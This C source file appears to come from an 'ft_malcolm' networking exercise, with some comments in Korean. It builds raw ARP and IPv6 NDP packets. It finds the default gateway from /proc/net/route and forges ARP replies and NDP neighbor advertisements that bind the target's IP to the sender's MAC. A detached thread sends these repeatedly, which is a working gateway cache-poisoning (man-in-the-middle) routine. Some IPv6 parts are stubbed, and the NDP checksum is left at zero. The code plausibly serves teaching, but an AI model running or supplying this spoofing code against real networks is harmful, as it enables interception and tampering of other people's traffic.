#include "malcolm.h"

void create_arp_request(unsigned char *buffer, const struct in_addr src_ip, const struct in_addr dest_ip,
                        unsigned char *src_mac)
{
  struct ethhdr    *eth_header = (struct ethhdr *)buffer;
  struct ether_arp *arp_header = (struct ether_arp *)(buffer + sizeof(struct ethhdr));

  // Ethernet 헤더 설정 (Broadcast)
  ft_memset(eth_header->h_dest, 0xff, ETH_ALEN); // Broadcast
  ft_memcpy(eth_header->h_source, src_mac, ETH_ALEN);
  eth_header->h_proto = htons(ETH_P_ARP);

  // ARP 헤더 설정
  arp_header->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);  // Ethernet
  arp_header->ea_hdr.ar_pro = htons(ETH_P_IP);      // IPv4
  arp_header->ea_hdr.ar_hln = ETH_ALEN;             // MAC 주소 길이
  arp_header->ea_hdr.ar_pln = IP_ADDR_LEN;          // IPv4 주소 길이
  arp_header->ea_hdr.ar_op  = htons(ARPOP_REQUEST); // ARP Request

  // ARP 패킷 필드 설정
  ft_memcpy(arp_header->arp_sha, src_mac, ETH_ALEN);
  ft_memcpy(arp_header->arp_spa, &src_ip, IP_ADDR_LEN);
  ft_memset(arp_header->arp_tha, 0x00, ETH_ALEN);
  ft_memcpy(arp_header->arp_tpa, &dest_ip, IP_ADDR_LEN);
}

void send_arp_request_packet_to_gateway(unsigned char *buffer, int buflen)
{
  struct sockaddr_ll dest_addr;

  create_arp_request(buffer, data.my_ipv4, data.gw_ipv4, data.my_mac);
  printf("gateway request packet!\n");
  if (DEBUG)
    print_arp_packet(buffer);
  ft_memset(&dest_addr, 0, sizeof(dest_addr));
  dest_addr.sll_family   = AF_PACKET;
  dest_addr.sll_protocol = htons(ETH_P_ARP);
  dest_addr.sll_ifindex  = data.if_index;
  dest_addr.sll_halen    = ETH_ALEN;
  ft_memset(dest_addr.sll_addr, 0xff, ETH_ALEN); // Broadcast
  if (sendto(data.sockfd, buffer, buflen, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) <= 0)
  {
    perror("sendto failed");
    exit(EXIT_FAILURE);
  }
  if (DEBUG)
    printf("gateway arp request send okay!!\n");
}

void make_gateway_arp_packet(unsigned char *buffer)
{
  struct ethhdr     *cur_eth = (struct ethhdr *)buffer;
  struct arp_packet *cur_arp = (struct arp_packet *)(buffer + sizeof(struct ethhdr));

  ft_memcpy(cur_eth->h_dest, data.gw_mac, sizeof(data.gw_mac));
  ft_memcpy(cur_eth->h_source, data.my_mac, sizeof(data.my_mac));
  ft_memcpy(cur_arp->target_ip, &data.gw_ipv4, sizeof(data.gw_ipv4));
  ft_memcpy(cur_arp->target_mac, data.gw_mac, sizeof(data.gw_mac));
  ft_memcpy(cur_arp->sender_ip, &data.target_ipv4, sizeof(data.target_ipv4));
  ft_memcpy(cur_arp->sender_mac, data.my_mac, sizeof(data.my_mac));
  cur_arp->hdr.ar_hrd = htons(1);
  cur_arp->hdr.ar_pro = htons(ETHERTYPE_IP);
  cur_arp->hdr.ar_hln = 6;
  cur_arp->hdr.ar_pln = 4;
  cur_arp->hdr.ar_op  = htons(ARPOP_REPLY);
}

static void get_gateway_ip()
{
  FILE         *fp = fopen("/proc/net/route", "r");
  char          line[256], iface[16];
  unsigned long dest, gateway;

  if (fp == NULL)
  {
    perror("fopen");
    return;
  }

  // 첫 번째 줄은 헤더, 건너뜁니다.
  fgets(line, sizeof(line), fp);

  while (fgets(line, sizeof(line), fp))
  {
    sscanf(line, "%15s %lx %lx", iface, &dest, &gateway);

    // dest가 0이면 기본 게이트웨이를 의미합니다.
    if (dest == 0 && ft_memcmp(iface, data.if_name, ft_strlen(iface)) == 0)
    {
      data.gw_ipv4.s_addr = gateway;
      printf("Interface: %s, Gateway: %s\n", iface, inet_ntoa(data.gw_ipv4));
      break;
    }
  }
  fclose(fp);
}

static void get_gateway_ipv6()
{
  // For IPv6, we'll use a simple link-local gateway discovery
  // This is a simplified approach - in practice, you'd use Router Discovery
  FILE *fp = fopen("/proc/net/ipv6_route", "r");
  char  line[512], dest[33], gateway[33], iface[16];
  int   prefix_len;

  if (fp == NULL)
  {
    perror("fopen IPv6 route");
    return;
  }

  while (fgets(line, sizeof(line), fp))
  {
    sscanf(line, "%32s %x %*s %*s %32s %*s %*s %*s %*s %15s", dest, &prefix_len, gateway, iface);

    // Look for default route (dest == "00000000000000000000000000000000")
    if (ft_strncmp(dest, "00000000000000000000000000000000", 32) == 0 &&
        ft_strncmp(iface, data.if_name, ft_strlen(iface)) == 0)
    {
      // Convert hex string to IPv6 address
      for (int i = 0; i < 16; i++)
      {
        char hex_byte[3] = {gateway[i * 2], gateway[i * 2 + 1], '\0'};
        data.gw_ipv6.s6_addr[i] = (unsigned char)strtol(hex_byte, NULL, 16);
      }
      printf("Interface: %s, IPv6 Gateway found\n", iface);
      break;
    }
  }
  fclose(fp);
}

void send_gateway_arp_request_packet(unsigned char *buffer, int buflen)
{
  get_gateway_ip();
  send_arp_request_packet_to_gateway(buffer, buflen);
}

void send_gateway_ndp_request_packet(unsigned char *buffer, int buflen)
{
  (void)buffer; // Suppress unused parameter warning
  (void)buflen; // Suppress unused parameter warning
  get_gateway_ipv6();
  // For simplicity, we'll skip the actual NDP solicitation for now
  // In a complete implementation, you'd send a Neighbor Solicitation
  printf("IPv6 NDP gateway request (simplified)\n");
}

// INFO : Get gateway mac address and then send reply
void send_gateway_spoofing_packet(unsigned char *buffer, int buflen)
{
  pthread_t          tid;
  struct thread_arg *arg;

  if (data.ip_type == IPV4)
    make_gateway_arp_packet(buffer);
  else
    make_gateway_ndp_packet(buffer);

  arg         = malloc(sizeof(struct thread_arg));
  arg->buffer = malloc(buflen);
  ft_memcpy(arg->buffer, buffer, buflen);
  ft_memcpy(arg->mac, data.gw_mac, MAC_ADDR_LEN);
  arg->buflen = buflen;
  if (DEBUG)
  {
    printf("gateway spoofing packet!!\n");
    if (data.ip_type == IPV4)
      print_arp_packet(buffer);
    else
      print_ndp_packet(buffer);
  }
  // TODO : clone을 써 보기
  if (pthread_create(&tid, NULL, data.ip_type == IPV4 ? send_fake_arp_reply : send_fake_ndp_reply, (void *)arg) != 0)
  {
    perror("pthread_create failed");
    exit(EXIT_FAILURE);
  }
  if (pthread_detach(tid) != 0)
  {
    perror("pthread_detach failed");
    exit(EXIT_FAILURE);
  }
}

void make_gateway_ndp_packet(unsigned char *buffer)
{
  struct ethhdr         *cur_eth = (struct ethhdr *)buffer;
  struct ipv6_ndp_packet *cur_ipv6_ndp = (struct ipv6_ndp_packet *)(buffer + sizeof(struct ethhdr));

  // Ethernet header
  ft_memcpy(cur_eth->h_dest, data.gw_mac, sizeof(data.gw_mac));
  ft_memcpy(cur_eth->h_source, data.my_mac, sizeof(data.my_mac));
  cur_eth->h_proto = htons(ETH_P_IPV6);

  // IPv6 header
  cur_ipv6_ndp->ipv6_hdr.ip6_vfc = 0x60; // Version 6
  cur_ipv6_ndp->ipv6_hdr.ip6_flow = 0;
  cur_ipv6_ndp->ipv6_hdr.ip6_plen = htons(sizeof(struct ndp_packet));
  cur_ipv6_ndp->ipv6_hdr.ip6_nxt = IPPROTO_ICMPV6;
  cur_ipv6_ndp->ipv6_hdr.ip6_hlim = 255;
  ft_memcpy(&cur_ipv6_ndp->ipv6_hdr.ip6_src, &data.target_ipv6, sizeof(data.target_ipv6));
  ft_memcpy(&cur_ipv6_ndp->ipv6_hdr.ip6_dst, &data.gw_ipv6, sizeof(data.gw_ipv6));

  // ICMPv6 NDP header (Neighbor Advertisement to gateway)
  cur_ipv6_ndp->ndp.icmp6_hdr.icmp6_type = ICMPV6_ND_NA; // Neighbor Advertisement
  cur_ipv6_ndp->ndp.icmp6_hdr.icmp6_code = 0;
  cur_ipv6_ndp->ndp.icmp6_hdr.icmp6_cksum = 0; // Will be calculated below
  cur_ipv6_ndp->ndp.icmp6_hdr.icmp6_data32[0] = htonl(0x60000000); // R=0, S=1, O=1 flags

  // Target IPv6 address (claiming to be the target)
  ft_memcpy(cur_ipv6_ndp->ndp.target_ip, &data.target_ipv6, sizeof(data.target_ipv6));

  // Target Link-Layer Address option (our MAC)
  cur_ipv6_ndp->ndp.option_type = 2;   // Target Link-Layer Address
  cur_ipv6_ndp->ndp.option_length = 1; // 8 bytes
  ft_memcpy(cur_ipv6_ndp->ndp.target_mac, data.my_mac, sizeof(data.my_mac));

  // Calculate ICMPv6 checksum - Need to make this function accessible
  cur_ipv6_ndp->ndp.icmp6_hdr.icmp6_cksum = 0; // Simplified for now
}
